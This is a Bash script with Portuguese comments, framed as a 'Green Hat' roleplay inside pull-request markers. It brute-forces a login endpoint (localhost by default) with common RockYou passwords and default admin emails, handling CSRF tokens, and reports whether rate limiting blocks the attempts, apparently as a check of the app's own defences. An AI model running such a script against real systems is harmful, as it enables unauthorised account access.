#!/usr/bin/env bash
# ▓ Roleplay: Green Hat — Brute Force Login
# Copiado de tutorial "bash brute force login curl"
# Iniciante. Tenta senhas comuns contra /login.
# PULL REQUEST START
set -euo pipefail

BASE="${APP_URL:-http://127.0.0.1:8000}"
TARGET="$BASE/login"

# Senhas copiadas do RockYou/SecLists (top 10)
PASSWORDS=(
  "123456"
  "password"
  "12345678"
  "qwerty"
  "abc123"
  "monkey"
  "1234567"
  "letmein"
  "trustno1"
  "admin"
)

EMAILS=(
  "admin@admin.com"
  "test@test.com"
  "user@example.com"
)

echo "[GREEN-HAT] Brute Force Login v0.1"
echo "[GREEN-HAT] Alvo: $TARGET"
echo "[GREEN-HAT] Tentando ${#EMAILS[@]} emails × ${#PASSWORDS[@]} senhas = $(( ${#EMAILS[@]} * ${#PASSWORDS[@]} )) combinações"
echo "---"

BLOCKED=0
ERRORS=0
ATTEMPTS=0

for email in "${EMAILS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    ATTEMPTS=$((ATTEMPTS + 1))

    # Pega CSRF token primeiro (como tutorial ensina)
    CSRF=$(curl -s -c /tmp/green-hat-cookies.txt "$TARGET" 2>/dev/null \
      | grep -oP 'name="_token"\s+value="\K[^"]+' || echo "no-csrf")

    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -b /tmp/green-hat-cookies.txt \
      -X POST "$TARGET" \
      -d "email=${email}&password=${pass}&_token=${CSRF}" \
      -L --max-redirs 3 \
      --max-time 10 2>/dev/null || echo "000")

    if [[ "$STATUS" == "429" ]]; then
      BLOCKED=$((BLOCKED + 1))
      echo "[BLOCKED] $email:$pass → $STATUS (rate limited)"
    elif [[ "$STATUS" == "000" ]]; then
      ERRORS=$((ERRORS + 1))
      echo "[ERROR]   $email:$pass → timeout/connection error"
    elif [[ "$STATUS" == "302" || "$STATUS" == "200" ]]; then
      echo "[MAYBE]   $email:$pass → $STATUS (redireciona — verificar)"
    else
      echo "[FAIL]    $email:$pass → $STATUS"
    fi
  done
done

echo "---"
echo "[GREEN-HAT] Resumo: $ATTEMPTS tentativas, $BLOCKED bloqueadas, $ERRORS erros"
echo "[GREEN-HAT] Conclusão: $([ $BLOCKED -gt 0 ] && echo 'Rate limiting ATIVO' || echo 'Sem rate limiting detectado')"

# Limpa cookies temporários
rm -f /tmp/green-hat-cookies.txt

exit 0
# PULL REQUEST END
